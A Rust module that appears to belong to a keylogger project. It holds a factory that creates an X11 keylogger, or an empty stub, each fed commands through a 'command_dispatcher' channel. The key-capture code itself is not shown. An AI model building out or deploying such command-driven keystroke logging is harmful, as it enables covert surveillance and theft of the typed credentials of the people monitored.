use super::empty_keylogger::EmptyKeylogger;
use super::keylogger::Keylogger;
use super::X_keylogger::XKeylogger;

use crate::command_dispatcher::KeyloggerCommand;
use std::sync::mpsc::{Receiver, TryRecvError};
use std::sync::{Arc, Mutex};

pub enum KeyloggerTypes {
    X,
    Wayland,
    Empty,
}

pub trait KeyloggerFact {
    fn create_keylogger(
        &self,
        ktype: KeyloggerTypes,
        rx: Receiver<KeyloggerCommand>,
    ) -> Result<Box<dyn Keylogger>, &'static str>;
}

pub struct KeyloggerFactory;

impl KeyloggerFact for KeyloggerFactory {
    fn create_keylogger(
        &self,
        ktype: KeyloggerTypes,
        rx: Receiver<KeyloggerCommand>,
    ) -> Result<Box<dyn Keylogger>, &'static str> {
        match ktype {
            KeyloggerTypes::X {} => {
                let xkeylogger = match XKeylogger::new(Arc::new(Mutex::new(rx))) {
                    Ok(keylogger) => keylogger,
                    Err(_) => {
                        return Err("Failed to initialize X keylogger");
                    }
                };

                return Ok(Box::new(xkeylogger));
            }
            _ => return Ok(Box::new(EmptyKeylogger {})),
        }
    }
}
